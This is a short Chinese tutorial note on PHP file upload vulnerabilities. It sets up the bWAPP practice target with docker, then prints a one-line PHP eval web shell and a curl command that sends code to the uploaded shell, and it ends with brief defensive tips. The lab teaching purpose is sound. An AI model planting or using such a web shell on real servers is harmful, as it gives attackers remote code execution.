## PHP 文件上传漏洞原理





我这里用 vagrant 启动本地的虚拟机，然后用 docker 安装靶机实验环境





```docker
docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
```



然后访问 http://127.0.0.1:80/install.php ， 对 bwapp 进行安装



```docker
docker container list -a

```

查看正在运行的容器



### 一句话漏洞原理



PHP里面有个 eval 函数， 非常的危险， 我上传 一个 .php 文件到服务器，然后访问这个 文件， 服务器就会执行



```php
<? php @eval($_POST['hacker']);?> 
```

```shell
curl -d "hacker="getcwd();" http://images/hacker.php
```



1. get_current_user 获取当前 PHP脚本的用户
2. getcwd 获取脚本当前的目录









解决文件上传漏洞



1. 白名单优于黑名单
2. 使用安全函数编程
3. 熟悉 部署环境的OS

















